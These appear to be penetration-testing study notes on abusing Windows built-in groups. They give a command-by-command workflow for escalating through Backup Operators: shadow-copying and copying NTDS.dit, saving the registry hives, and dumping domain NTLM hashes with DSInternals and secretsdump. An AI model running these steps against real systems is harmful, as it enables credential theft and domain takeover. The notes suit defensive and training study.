# **Windows Built-in Groups**

## **Overview**

- Windows Server and Domain Controllers contain built-in security groups.
- Membership in certain groups grants special privileges that can be abused for **Privilege Escalation**.
- Always enumerate built-in group memberships during an assessment.
- Unnecessary or excessive group membership can expose sensitive resources.

**Important groups to enumerate:**

| Group                  | Key significance                                          |
| ---------------------- | --------------------------------------------------------- |
| Backup Operators       | Backup and restore privileges; potential credential theft |
| Event Log Readers      | Read Windows event logs                                   |
| DnsAdmins              | DNS administration privileges                             |
| Hyper-V Administrators | Manage Hyper-V virtual machines                           |
| Print Operators        | Manage printers and print services                        |
| Server Operators       | Manage certain server operations                          |

**Enumeration:**

```
whoami /groups
```

## **Backup Operators**

High Privilege Escalation Potential

Membership in `Backup Operators` grants:

- `SeBackupPrivilege`
- `SeRestorePrivilege`

### **SeBackupPrivilege**

- Allows traversing directories and listing their contents.
- Allows copying protected files, even without the required NTFS ACL permissions.
- Requires backup semantics (`FILE_FLAG_BACKUP_SEMANTICS`).
- Standard `copy` command cannot directly leverage this privilege.

### **1. Import Required Libraries**

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### **2. Check Privileges**

```
whoami /priv
```

Alternatively:

```
Get-SeBackupPrivilege
```

### **3. Enable SeBackupPrivilege**

```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Verify:

```
whoami /priv
```

Look for:

```
SeBackupPrivilege    Enabled
```

Note: An elevated CMD/PowerShell session may be required to bypass UAC.

### **4. Copy Protected Files**

Normal access will fail:

```
cat 'C:\Confidential\2021 Contract.txt.txt'
```

Use the provided cmdlet:

```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
```

**Key takeaway:** `SeBackupPrivilege` can bypass normal file ACL restrictions when files are opened using backup semantics.

## **Attacking a Domain Controller – NTDS.dit**

Critical

`NTDS.dit` is the Active Directory database containing domain user and computer account credential information, including NTLM hashes.

**Attack workflow:**

1. Obtain `SeBackupPrivilege`.
2. Create a shadow copy of the C: drive.
3. Expose the shadow copy as another drive.
4. Copy `NTDS.dit`.
5. Obtain the SYSTEM hive.
6. Extract domain hashes offline.

### **1. Create Shadow Copy Using Diskshadow**

```
diskshadow.exe
```

Execute:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

**Why shadow copy?**

- `NTDS.dit` is normally locked by Windows.
- A shadow copy provides an accessible snapshot of the drive.
- The copied database is no longer actively used by the system.

### **2. Copy NTDS.dit**

```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### **3. Backup SAM and SYSTEM Hives**

```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

**Important:**

- `NTDS.dit` + SYSTEM hive → Extract domain credentials.
- SAM + SYSTEM hives → Extract local account credentials.

### **4. Extract Credentials Using DSInternals**

Import module:

```
Import-Module .\DSInternals.psd1
```

Get Boot Key:

```
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

Extract Administrator credentials:

```
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Look for:

```
NTHash: <NTLM_HASH>
```

### **5. Extract Hashes Using Impacket SecretsDump**

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

**Output format:**

```
username:RID:LMHash:NTHash:::
```

**What can we do with extracted hashes?**

- Pass-the-Hash attacks.
- Offline password cracking using Hashcat.
- Identify weak or reused passwords.
- Assess overall domain password security.

## **Robocopy**

Windows built-in `robocopy` can also copy protected files using backup mode.

### **Syntax**

```
robocopy /B <source_directory> <destination_directory> <filename>
```

### **Copy NTDS.dit**

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

**Important switches:**

| Switch | Description                                                 |
| ------ | ----------------------------------------------------------- |
| `/B`   | Copy files in Backup mode                                   |
| `/R`   | Number of retries                                           |
| `/W`   | Wait time between retries                                   |
| `/MIR` | Mirror source to destination (can delete destination files) |

**Robocopy advantages:**

- Multi-threaded copying.
- Automatic retries.
- Resumes interrupted copying.
- Supports backup mode.
- Can compare source and destination files.
